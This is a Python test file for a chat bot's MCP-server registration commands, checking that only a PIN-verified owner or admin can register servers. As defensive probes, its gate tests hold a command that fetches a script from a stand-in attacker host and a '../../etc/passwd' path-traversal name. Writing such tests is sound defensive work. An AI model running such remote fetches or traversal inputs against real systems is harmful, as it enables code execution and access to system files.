#!/usr/bin/env python3
"""Tests for /addmcp, /rmmcp, /mcpservers and the --mcp-config wiring.

The review that asked for MCP support attached one condition to it, and that
condition is the whole reason these tests exist: registering an MCP server
adds a genuinely new trust surface -- an MCP server can read and write on the
agent's behalf -- so registration must be gated exactly like /addserver
(owner anywhere, or a registered group's own admin, PIN required), and the
MODEL must never be able to register one for itself.

The wiring itself was verified live against the real claude CLI before any of
this was written: a hand-rolled stdio server, --mcp-config pointed at it, a
real tools/list + tools/call round-trip returning the exact marker string,
with "permission_denials":[] confirming mcp__<server> actually grants access.
What's left to protect here is the gate and the command assembly, which is
what these cover.
"""
import asyncio, importlib.util, json, os, sys, tempfile
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import AsyncMock, patch

SRC = sys.argv[1]
sys.path.insert(0, str(Path(SRC).resolve().parent / "tools"))
scratch = Path(tempfile.mkdtemp(prefix="isla_mcpcmd_"))
os.environ["HOME"] = str(scratch)
os.environ.setdefault("TELEGRAM_BOT_TOKEN", "t")
os.environ.setdefault("ALLOWED_USER_IDS", "111")
os.environ["ALLOWED_GROUP_IDS"] = ""

spec = importlib.util.spec_from_file_location("la", SRC)
mod = importlib.util.module_from_spec(spec)
sys.modules["la"] = mod
spec.loader.exec_module(mod)

# BASE_DIR-relative, like LEDGER_FILE -- sandbox it so a test run never writes
# a real mcp_servers.json into the checkout (see test_concurrency.py).
mod.MCP_CONFIG_FILE = scratch / "mcp_servers.json"
mod.LEDGER_FILE = scratch / "spend.jsonl"

results = []
def check(name, cond):
    results.append((name, bool(cond)))
    print(("PASS" if cond else "FAIL"), "-", name)

def upd(uid=111, chat=111, ctype="private"):
    msg = SimpleNamespace(text="", reply_text=AsyncMock())
    return SimpleNamespace(message=msg, effective_message=msg, callback_query=None,
                           effective_user=SimpleNamespace(id=uid),
                           effective_chat=SimpleNamespace(id=chat, type=ctype, title=None))

def ctx(args):
    return SimpleNamespace(bot=SimpleNamespace(send_chat_action=AsyncMock()), args=args)

def sent(u):
    return u.message.reply_text.call_args[0][0] if u.message.reply_text.call_args else ""


# --- 1. round-trip through the registry file --------------------------------
mod.register_mcp_server("reports", "python3", ["tools/mcp_readonly_fs.py", "/srv/reports"])
check("a registered server is readable back", "reports" in mod.read_mcp_servers())
check("...with its command and args intact",
      mod.read_mcp_servers()["reports"] == {"command": "python3",
          "args": ["tools/mcp_readonly_fs.py", "/srv/reports"]})

on_disk = json.loads(mod.MCP_CONFIG_FILE.read_text())
check("the file on disk is in the EXACT shape --mcp-config expects, so it can "
      "be handed to the CLI unmodified",
      list(on_disk.keys()) == ["mcpServers"] and "reports" in on_disk["mcpServers"])

check("the allowedTools suffix grants the whole server, matching the "
      "granularity /addserver already uses for a whole machine",
      mod._mcp_allowed_tools_suffix() == "mcp__reports")

mod.register_mcp_server("db", "python3", ["x.py"])
check("two servers both appear in the suffix, sorted",
      mod._mcp_allowed_tools_suffix() == "mcp__db,mcp__reports")

check("removing one returns True", mod.remove_mcp_server("db") is True)
check("...and it is gone from the suffix",
      mod._mcp_allowed_tools_suffix() == "mcp__reports")
check("removing something absent returns False, not a crash",
      mod.remove_mcp_server("never-existed") is False)

# --- 2. a corrupt registry degrades to empty, never takes the bot down ------
mod.MCP_CONFIG_FILE.write_text("{not json at all")
check("an unreadable registry yields no servers instead of raising",
      mod.read_mcp_servers() == {})
check("...and the suffix is empty, so the CLI call is built without MCP at all",
      mod._mcp_allowed_tools_suffix() == "")
mod.MCP_CONFIG_FILE.unlink()
check("a missing registry file is simply 'nothing registered'",
      mod.read_mcp_servers() == {})


# --- 2b. the agy half -------------------------------------------------------
# agy keeps MCP servers in its own persistent config (`agy mcp add`), with no
# per-invocation flag -- so unlike claude, the registry has to be PUSHED to it.
# This matters for cost: agy is the default, cheapest tier, so without this
# half MCP tools would only be reachable on the expensive escalation path.
with patch.object(mod, "subprocess") as sp:
    sp.run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
    mod.register_mcp_server("reports", "python3", ["x.py", "/srv"])
    argv = sp.run.call_args[0][0] if sp.run.call_args else []
check("registering also pushes the server into agy's own config",
      argv[1:] == ["mcp", "add", "reports", "python3", "x.py", "/srv"])

with patch.object(mod, "subprocess") as sp:
    sp.run.return_value = SimpleNamespace(returncode=0, stdout="", stderr="")
    mod.remove_mcp_server("reports")
    argv = sp.run.call_args[0][0] if sp.run.call_args else []
check("removing withdraws it from agy too", argv[1:] == ["mcp", "remove", "reports"])

# agy missing, or an older build without the subcommand, must NOT stop a
# registration the Claude side would honour perfectly well.
with patch.object(mod.subprocess, "run", side_effect=OSError("no such binary")):
    mod.register_mcp_server("solo", "python3", ["y.py"])
check("agy being absent does not block registration -- the claude side still "
      "gets it", "solo" in mod.read_mcp_servers())

with patch.object(mod.subprocess, "run",
                  return_value=SimpleNamespace(returncode=1, stdout="", stderr="unknown command")):
    mod.register_mcp_server("solo2", "python3", ["y.py"])
check("an agy that rejects the subcommand is logged, not raised",
      "solo2" in mod.read_mcp_servers())
mod.MCP_CONFIG_FILE.unlink(missing_ok=True)


# --- 3. the gate ------------------------------------------------------------
async def main():
    # A non-owner must not get through.
    with patch.object(mod, "_may_run_setup", return_value=True), \
         patch.object(mod, "_is_owner", return_value=False), \
         patch.object(mod, "_is_group_admin", new=AsyncMock(return_value=False)), \
         patch.object(mod, "request_pin", new=AsyncMock()) as rp:
        u = upd(uid=999)
        await mod.cmd_addmcp(u, ctx(["evil", "curl", "http://attacker/x.sh"]))
    check("a non-owner, non-admin cannot register an MCP server (THE condition "
          "the review attached to this feature)", rp.await_count == 0)
    check("...and is told why", "owner" in sent(u).lower() or "pemilik" in sent(u).lower())
    check("...and nothing was written to the registry", mod.read_mcp_servers() == {})

    # Owner with a PIN set -> PIN gate, NOT an immediate registration.
    with patch.object(mod, "_may_run_setup", return_value=True), \
         patch.object(mod, "_is_owner", return_value=True), \
         patch.object(mod, "pin_is_set", return_value=True), \
         patch.object(mod, "request_pin", new=AsyncMock()) as rp:
        u = upd()
        await mod.cmd_addmcp(u, ctx(["reports", "python3", "tools/mcp_readonly_fs.py", "/srv/r"]))
    check("the owner with a PIN set is sent to the PIN keypad", rp.await_count == 1)
    check("...under the 'addmcp' action", rp.await_args[0][1] == "addmcp")
    check("...carrying the exact command and args to register",
          rp.await_args[0][2] == {"name": "reports", "command": "python3",
                                  "args": ["tools/mcp_readonly_fs.py", "/srv/r"]})
    check("...and NOTHING is registered until the PIN actually checks out",
          mod.read_mcp_servers() == {})

    # Bare /addmcp shows the ready-to-use default.
    with patch.object(mod, "_may_run_setup", return_value=True), \
         patch.object(mod, "_is_owner", return_value=True):
        u = upd()
        await mod.cmd_addmcp(u, ctx([]))
    txt = sent(u)
    check("bare /addmcp shows a concrete, ready-to-use example",
          "mcp_readonly_fs.py" in txt)
    check("...and says it needs no install and stays read-only",
          ("read-only" in txt or "read only" in txt) and ("stdlib" in txt or "pip" in txt))

    # A bad name is refused before anything is stored.
    with patch.object(mod, "_may_run_setup", return_value=True), \
         patch.object(mod, "_is_owner", return_value=True), \
         patch.object(mod, "request_pin", new=AsyncMock()) as rp:
        u = upd()
        await mod.cmd_addmcp(u, ctx(["../../etc/passwd", "python3", "x.py"]))
    check("a name with path separators is refused, not registered",
          rp.await_count == 0 and mod.read_mcp_servers() == {})

    # /rmmcp needs no PIN -- it only ever REDUCES the tool surface.
    mod.register_mcp_server("reports", "python3", ["x.py"])
    with patch.object(mod, "_may_run_setup", return_value=True), \
         patch.object(mod, "_is_owner", return_value=True), \
         patch.object(mod, "request_pin", new=AsyncMock()) as rp:
        u = upd()
        await mod.cmd_rmmcp(u, ctx(["reports"]))
    check("/rmmcp removes without a PIN -- it only ever reduces capability",
          rp.await_count == 0 and mod.read_mcp_servers() == {})

    # /mcpservers lists, zero tokens.
    mod.register_mcp_server("reports", "python3", ["tools/mcp_readonly_fs.py", "/srv/r"])
    with patch.object(mod, "_authorized", return_value=True):
        u = upd()
        await mod.cmd_mcpservers(u, ctx([]))
    check("/mcpservers shows the registered name and its command line",
          "reports" in sent(u) and "mcp_readonly_fs.py" in sent(u))

    failed = [n for n, ok in results if not ok]
    print(f"\n{len(results) - len(failed)}/{len(results)} passed")
    if failed:
        print("FAILED:", failed)
        sys.exit(1)

asyncio.run(main())
